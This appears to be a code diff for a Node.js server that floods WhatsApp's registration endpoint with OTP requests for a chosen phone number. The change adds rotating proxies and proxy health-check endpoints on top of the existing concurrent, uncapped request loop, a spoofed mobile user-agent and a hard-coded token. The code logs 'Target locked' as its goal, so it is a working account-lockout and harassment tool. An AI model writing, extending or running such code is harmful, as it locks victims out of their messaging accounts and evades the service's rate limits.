@@ -3,6 +3,7 @@ const cors = require('cors');
 const axios = require('axios');
 const crypto = require('crypto');
 const { v4: uuidv4 } = require('uuid');
+const { HttpsProxyAgent } = require('https-proxy-agent');
 require('dotenv').config();
 
 const app = express();
@@ -17,6 +18,7 @@ const DEFAULT_MOBILE_TOKEN = '0a1mLfGUIBVrMKF1RdvLI5lkRBvof6vn0fD2QRSM4174c0243f
 let isRunning = false;
 let currentTask = null;
 let logs = [];
+let proxies = [];
 
 function addLog(message) {
     const entry = `[${new Date().toISOString()}] ${message}`;
@@ -27,7 +29,7 @@ function addLog(message) {
 
 // Utility functions for registration
 const MOBILE_REGISTRATION_ENDPOINT = 'https://v.whatsapp.net/v2';
-const MOBILE_USERAGENT = 'WhatsApp/2.22.24.81 iOS/15.3.1 Device/Apple-iPhone_7';
+const MOBILE_USERAGENT = 'WhatsApp/2.26.21.73 Android/13 Device/samsung-SM-G991B';
 
 function urlencode(str) {
     return str.replace(/-/g, '%2d').replace(/_/g, '%5f').replace(/~/g, '%7e');
@@ -49,7 +51,7 @@ function randomUrlHex(length) {
     return result;
 }
 
-async function requestOTP(cc, number, mobileToken, mcc, mnc) {
+async function requestOTP(cc, number, mobileToken, mcc, mnc, proxyUrl = null) {
     const nationalNumber = number.replace(/[/-\s)(]/g, '').trim();
     const phoneId = uuidv4();
     const deviceId = Buffer.from(uuidv4().replace(/-/g, ''), 'hex').toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
@@ -76,13 +78,20 @@ async function requestOTP(cc, number, mobileToken, mcc, mnc) {
     const url = `${MOBILE_REGISTRATION_ENDPOINT}/code?${queryString}`;
 
     try {
-        const response = await axios.get(url, {
+        const config = {
             headers: {
                 'User-Agent': MOBILE_USERAGENT,
                 'Accept': 'application/json'
             },
             timeout: 10000
-        });
+        };
+
+        if (proxyUrl) {
+            config.httpsAgent = new HttpsProxyAgent(proxyUrl);
+            config.proxy = false; // Disable axios default proxy handling when using httpsAgent
+        }
+
+        const response = await axios.get(url, config);
         return response.data;
     } catch (error) {
         return error.response ? error.response.data : { error: error.message };
@@ -112,7 +121,66 @@ app.post('/verify-password', (req, res) => {
 });
 
 app.get('/status', authMiddleware, (req, res) => {
-    res.json({ isRunning, currentTask, logs });
+    res.json({ isRunning, currentTask, logs, proxies });
+});
+
+app.get('/proxies', authMiddleware, (req, res) => {
+    res.json(proxies);
+});
+
+app.post('/proxies', authMiddleware, (req, res) => {
+    const { url } = req.body;
+    if (!url) return res.status(400).json({ error: 'Proxy URL is required' });
+
+    const id = uuidv4();
+    proxies.push({ id, url, status: 'unknown', lastChecked: null });
+    res.json({ success: true, id });
+});
+
+app.delete('/proxies/:id', authMiddleware, (req, res) => {
+    proxies = proxies.filter(p => p.id !== req.params.id);
+    res.json({ success: true });
+});
+
+app.post('/proxies/test', authMiddleware, async (req, res) => {
+    const { url, testUrl } = req.body;
+    const target = testUrl || 'https://v.whatsapp.net/v2/code';
+
+    try {
+        const agent = new HttpsProxyAgent(url);
+        const startTime = Date.now();
+        await axios.get(target, {
+            httpsAgent: agent,
+            proxy: false,
+            timeout: 5000,
+            validateStatus: () => true // Accept any status for health check
+        });
+        const latency = Date.now() - startTime;
+        res.json({ success: true, latency });
+    } catch (error) {
+        res.json({ success: false, error: error.message });
+    }
+});
+
+app.post('/proxies/check-all', authMiddleware, async (req, res) => {
+    const results = [];
+    for (let proxy of proxies) {
+        try {
+            const agent = new HttpsProxyAgent(proxy.url);
+            await axios.get('https://v.whatsapp.net/v2/code', {
+                httpsAgent: agent,
+                proxy: false,
+                timeout: 5000,
+                validateStatus: () => true
+            });
+            proxy.status = 'active';
+        } catch (error) {
+            proxy.status = 'dead';
+        }
+        proxy.lastChecked = new Date().toISOString();
+        results.push(proxy);
+    }
+    res.json(results);
 });
 
 app.post('/start', authMiddleware, (req, res) => {
@@ -133,6 +201,7 @@ app.post('/start', authMiddleware, (req, res) => {
         let count = 0;
         const totalRequests = parseInt(maxRequests) || Infinity;
         const parallel = parseInt(concurrency) || 1;
+        let proxyIndex = 0;
 
         while (isRunning && count < totalRequests) {
             const batch = [];
@@ -140,13 +209,21 @@ app.post('/start', authMiddleware, (req, res) => {
             const currentBatchSize = Math.min(parallel, remaining);
 
             for (let i = 0; i < currentBatchSize; i++) {
-                batch.push((async (idx) => {
-                    const res = await requestOTP(cc, number, mToken, mcc, mnc);
-                    addLog(`Request #${idx} Result: ${JSON.stringify(res)}`);
+                const activeProxies = proxies.filter(p => p.status === 'active' || p.status === 'unknown');
+                let proxyUrl = null;
+
+                if (activeProxies.length > 0) {
+                    proxyUrl = activeProxies[proxyIndex % activeProxies.length].url;
+                    proxyIndex++;
+                }
+
+                batch.push((async (idx, pUrl) => {
+                    const res = await requestOTP(cc, number, mToken, mcc, mnc, pUrl);
+                    addLog(`Request #${idx} ${pUrl ? '(via proxy)' : ''} Result: ${JSON.stringify(res)}`);
                     if (res.reason === 'temporarily_unavailable') {
                         addLog(`Success: Target locked (temporarily_unavailable).`);
                     }
-                })(count + i + 1));
+                })(count + i + 1, proxyUrl));
             }
             await Promise.all(batch);
             count += currentBatchSize;
